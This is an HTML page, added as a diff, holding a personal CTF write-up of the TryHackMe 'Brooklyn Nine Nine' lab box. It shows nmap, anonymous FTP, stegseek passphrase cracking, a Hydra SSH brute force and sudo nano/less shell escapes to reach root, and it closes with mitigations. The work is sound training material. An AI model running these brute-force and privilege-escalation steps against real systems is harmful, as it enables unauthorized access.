@@ -1,0 +1,191 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Brooklyn Nine Nine — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="An anonymous FTP login hands over a note hinting that Jake's password is weak, and the site's HTML source drops a not-so-subtle "have you heard of…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/brooklynninenine.html">
+<meta property="og:title" content="Brooklyn Nine Nine — TryHackMe writeup">
+<meta property="og:description" content="An anonymous FTP login hands over a note hinting that Jake's password is weak, and the site's HTML source drops a not-so-subtle "have you heard of…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/brooklynninenine.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Brooklyn Nine Nine — TryHackMe writeup","description":"An anonymous FTP login hands over a note hinting that Jake's password is weak, and the site's HTML source drops a not-so-subtle \"have you heard of…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-26","url":"https://thecyberfarhan.github.io/writeups/brooklynninenine.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/brooklynninenine.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Brooklyn Nine Nine</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 26, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>An anonymous FTP login hands over a note hinting that Jake's password is weak, and the site's HTML source drops a not-so-subtle "have you heard of steganography?" comment pointing at the homepage background image. Cracking that image with <code>stegseek</code> and <code>rockyou.txt</code> reveals Holt's password buried inside — but a username mix-up (<code>holts</code> instead of <code>holt</code>) burns the first login attempt. Brute-forcing Jake's SSH login instead gets a foothold, confirms the leaked password was right all along, and a <code>sudo -l</code> check on Holt's account turns up a NOPASSWD <code>nano</code> entry that doesn't pan out — the actual root read comes through Jake's own <code>sudo less</code> GTFOBin entry. </div>
+  <div class="tools"><span class="chip">🔎 Nmap</span><span class="chip">📁 FTP (anonymous login)</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🖼 ExifTool / Binwalk</span><span class="chip">🕵 Stegseek</span><span class="chip">🐎 Hydra</span><span class="chip">🔓 GTFOBins (<code>nano</code>, <code>less</code> via sudo)</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>*Today's victim is run by Brooklyn's finest* — or at least, a box themed after them. Somewhere between an anonymous FTP share, a suspiciously generic stock background image, and two squad members who really should have used a password manager, there's a root flag waiting. Captain Holt would not be pleased with how this one goes down.</p>
+<h2 data-reveal>Recon</h2>
+<p class="aside">Standard nmap service scan against the target:</p>
+<pre><code>nmap -sV -sC 10.49.142.139</code></pre>
+
+<pre><code>PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).</code></pre>
+<p>Cleaned up as a table:</p>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>21</td><td>FTP</td><td>vsftpd 3.0.3 (anonymous login allowed)</td></tr><tr><td>22</td><td>SSH</td><td>OpenSSH 7.6p1 (Ubuntu)</td></tr><tr><td>80</td><td>HTTP</td><td>Apache 2.4.29 (Ubuntu)</td></tr></tbody></table>
+<p>*The <code>ftp-anon</code> line in the nmap output is doing a lot of the work here* — anonymous FTP access is practically an open invitation, and there's already a named file (<code>note_to_jake.txt</code>) sitting in the root of the share.</p>
+<h3>Anonymous FTP grab</h3>
+<pre><code>ftp 10.49.142.139
+# Name: anonymous
+# Password: (blank)</code></pre>
+
+<pre><code>230 Login successful.
+ftp&gt; get note_to_jake.txt
+226 Transfer complete.</code></pre>
+
+<pre><code>cat note_to_jake.txt</code></pre>
+
+<pre><code>From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine</code></pre>
+<p>*Subtle as a brick* — but useful. This confirms Jake is a valid username and that his password is expected to be weak, which is basically a green light for a wordlist-based brute force later.</p>
+<h3>Poking at the website</h3>
+<p class="aside">Viewing the page source of the homepage:</p>
+<pre><code>curl -s http://10.49.142.139/ | grep -A2 -B2 "!--"</code></pre>
+
+<pre><code>&lt;div class="bg"&gt;&lt;/div&gt;
+&lt;p&gt;This example creates a full page background image...&lt;/p&gt;
+&lt;!-- Have you ever heard of steganography? --&gt;</code></pre>
+<p>A hidden HTML comment directly asking about steganography. *Not exactly a riddle, but it tells us exactly where to look next* — the background image referenced earlier in the page's CSS.</p>
+<p>Feroxbuster was run twice — once against a common wordlist, once against a much larger subdomain list — *and came back essentially empty both times* aside from the index page itself. No hidden directories to chase here; the real path forward was always going to be that image.</p>
+<h2 data-reveal>Foothold</h2>
+<h3>Pulling and inspecting the image</h3>
+<pre><code>wget http://10.49.142.139/brooklyn99.jpg
+exiftool brooklyn99.jpg</code></pre>
+<p>ExifTool came back clean — *standard JPEG metadata, nothing embedded in the EXIF fields themselves.* <code>binwalk</code> was equally uneventful, reporting just a plain JPEG structure with no obviously appended files. *This pointed toward a passphrase-protected steganography tool like steghide rather than a raw file concatenation trick.*</p>
+<p>A direct <code>steghide extract</code> attempt without a passphrase failed outright:</p>
+<pre><code>steghide extract -sf brooklyn99.jpg</code></pre>
+
+<pre><code>steghide: can not uncompress data. compressed data is corrupted.</code></pre>
+<p class="aside">An empty passphrase wasn't going to cut it — time to brute force the passphrase itself instead of the extraction.</p>
+<h3>Cracking the steg passphrase</h3>
+<p><code>stegseek</code> automates exactly this: it takes a wordlist and tries each entry as a steghide passphrase until one successfully extracts embedded data.</p>
+<p class="aside">Running stegseek against the image using rockyou as the candidate passphrase list:</p>
+<pre><code>stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt</code></pre>
+
+<pre><code>[i] Found passphrase: "admin"
+[i] Original filename: "note.txt".
+[i] Extracting to "brooklyn99.jpg.out".
+# ^^^ this is the important bit</code></pre>
+<ul><li>the passphrase itself turned out to be the painfully generic <code>admin</code></li><li>*this took an embarrassingly short amount of time* given the simplicity of the password, but the bigger time sink had been the dead-end metadata checks before reaching for stegseek at all</li></ul>
+<p class="aside">Reading the extracted file:</p>
+<pre><code>cat brooklyn99.jpg.out</code></pre>
+
+<pre><code>Holts Password:
+fluffydog12@ninenine
+
+Enjoy!!</code></pre>
+<p>*(~8 mins into the box)* — a clean credential, handed over in plaintext. The only catch: it's labeled for "Holt," not for the actual system username.</p>
+<h2 data-reveal>Shell / Access</h2>
+<h3>The username trap</h3>
+<p>The note says "Holts Password" — *a reasonably natural reading of that is the username being <code>holts</code>,* so that's what got tried first:</p>
+<pre><code>ssh holts@10.49.142.139</code></pre>
+
+<pre><code>holts@10.49.142.139: Permission denied (publickey,password).</code></pre>
+<p>*Three strikes and out.* Rather than burn more attempts guessing username variations, the smarter move was pivoting to the other known username — Jake — and brute-forcing his login instead, using the explicit "weak password" hint from the FTP note as justification for going straight to rockyou.</p>
+<h3>Brute forcing Jake</h3>
+<pre><code>hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.49.142.139</code></pre>
+
+<pre><code>[22][ssh] host: 10.49.142.139   login: jake   password: 987654321
+1 of 1 target successfully completed, 1 valid password found</code></pre>
+<table><thead><tr><th>Username</th><th>Password</th><th>Where found</th></tr></thead><tbody><tr><td>jake</td><td><code>987654321</code></td><td>Hydra brute force against rockyou.txt</td></tr><tr><td>holt</td><td><code>fluffydog12@ninenine</code></td><td>Steghide-extracted note.txt inside brooklyn99.jpg</td></tr></tbody></table>
+<pre><code>ssh jake@10.49.142.139</code></pre>
+
+<pre><code>jake@brookly_nine_nine:~$ ls /home
+amy  holt  jake</code></pre>
+<p>*And there it is* — the actual home directory is <code>holt</code>, not <code>holts</code>. The earlier failed login wasn't a wrong password, it was a wrong username the whole time.</p>
+<pre><code>su holt
+# Password: fluffydog12@ninenine</code></pre>
+
+<pre><code>holt@brookly_nine_nine:/home/jake$</code></pre>
+<p>Confirmed — the steg-extracted password was correct all along; it just needed the right account name attached to it.</p>
+<pre><code>holt@brookly_nine_nine:~$ cat user.txt
+ee11cbb19052e40b07aac0ca060c23ee</code></pre>
+<p>User flag captured. *(~16 mins into the box)*</p>
+<h2 data-reveal>Escalation</h2>
+<h3>Checking sudo rights</h3>
+<p class="aside">Standard privilege check as holt:</p>
+<pre><code>sudo -l</code></pre>
+
+<pre><code>User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano</code></pre>
+<p><code>nano</code> running as root with no password is a textbook GTFOBins entry — *nano can normally be used to spawn a root shell via its built-in command-execution feature.* This attempt didn't pan out within the session (see Rabbit Holes), so the check was repeated on Jake's account instead:</p>
+<pre><code>su jake
+sudo -l</code></pre>
+
+<pre><code>User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less</code></pre>
+<p><code>less</code> is an even more reliable GTFOBin — *when sudo grants passwordless <code>less</code>, you can simply open any file and use less's internal shell escape to drop into a root shell, or in this case just page through restricted files directly as root.*</p>
+<h3>Reading root.txt</h3>
+<pre><code>sudo /usr/bin/less /root/root.txt</code></pre>
+
+<pre><code>-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a9f0ea7bb98050796b649e85481845
+
+Enjoy!!</code></pre>
+<p>Root flag captured. *(~22 mins into the box)*</p>
+<h2 data-reveal>Rabbit Holes</h2>
+<p><strong>EXIF and binwalk on the image:</strong> Both came back clean, *which in hindsight was the actual signal to move straight to a passphrase-protected steg tool rather than a spending more time digging through metadata.* The HTML comment had already pointed at "steganography" specifically, so a passphrase-based approach (steghide/stegseek) should have been the first move rather than the third.</p>
+<p><strong><code>holts</code> vs <code>holt</code>:</strong> The note's phrasing ("Holts Password") reads naturally as a username, but it was actually just a possessive ("Holt's password") describing whose credential it was. *A quick <code>ls /home</code> after landing on the box would have settled this immediately instead of guessing.* This burned the SSH attempt limit on a perfectly valid password attached to the wrong account name.</p>
+<p><strong><code>/bin/nano</code> as holt:</strong> The NOPASSWD sudo entry for nano looked like the obvious privesc path, and the command was run directly against <code>/root/root.txt</code>. *No output or shell escape was captured from this attempt in the session* — nano's GTFOBins technique typically requires using its in-editor command execution (<code>^R^X</code>, then <code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code>) rather than just opening a file directly, which likely explains why this didn't produce a usable result on its own. The working path ended up being Jake's separate <code>less</code> entitlement instead.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Anonymous FTP access enabled</td><td class="sev-medium">Medium</td><td>Disable anonymous FTP login entirely unless explicitly required, and never store sensitive notes on a publicly readable share</td></tr><tr><td>Credentials embedded in steganographic image</td><td class="sev-medium">Medium</td><td>Never distribute credentials via hidden files, even "obscured" ones — security through obscurity is not access control</td></tr><tr><td>Weak, wordlist-crackable passwords</td><td class="sev-high">High</td><td>Enforce strong password policies and rate-limit/lock out SSH after repeated failed attempts</td></tr><tr><td>Passwordless <code>sudo</code> on <code>nano</code></td><td class="sev-critical">Critical</td><td>Avoid NOPASSWD sudo grants for any editor or pager binary; if required, use a restricted wrapper instead of the raw binary</td></tr><tr><td>Passwordless <code>sudo</code> on <code>less</code></td><td class="sev-critical">Critical</td><td>Same as above — pagers with shell-escape capability are equivalent to a full root shell when granted via sudo</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>A correct password attached to a guessed username is indistinguishable from a wrong password until you actually check <code>/etc/passwd</code> or <code>/home</code> — verify the account name before burning login attempts.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>I'd jump straight to <code>stegseek</code> with rockyou the moment the HTML comment mentioned steganography, instead of spending time on EXIF and binwalk checks first.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/brooklynninenine_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
